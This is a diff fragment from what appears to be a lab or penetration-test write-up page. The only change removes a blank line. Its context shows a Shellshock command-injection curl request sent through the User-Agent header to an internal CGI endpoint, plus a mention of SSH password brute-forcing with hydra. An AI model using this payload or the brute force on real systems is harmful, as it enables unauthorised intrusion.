@@ -21,7 +21,6 @@ layout: /src/layouts/MarkdownLayout.astro
     RUN_ON_HOST="cat /etc/issue"
     curl -H "User-Agent: () { : ; }; echo; $RUN_HOST" http://10.0.5.23/cgi-bin/status
     ```
-
 4. The generation of a list of passwords and subsequent ssh bruteforce
 
     The creation of a wordlist and usage of hydra worked fine as in the documentation.
